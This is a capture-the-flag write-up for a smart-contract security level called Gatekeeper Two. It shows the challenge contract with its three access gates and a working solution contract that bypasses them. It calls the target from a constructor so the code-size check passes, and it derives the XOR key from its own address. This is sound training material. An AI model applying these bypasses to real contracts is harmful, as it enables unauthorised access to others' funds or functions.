## Challenge
~~~
This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

##### Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
`

## Solution

```
contract Hack {
    constructor(IGateKeeperTwo target) {
        // Bitwise xor
        // a     = 1010
        // b     = 0110
        // a ^ b = 1100

        // a ^ a ^ b = b

        // a     = 1010
        // a     = 1010
        // a ^ a = 0000

        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max 
        //         key = s ^ max 
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}
```

## Key takeaways and useful resources



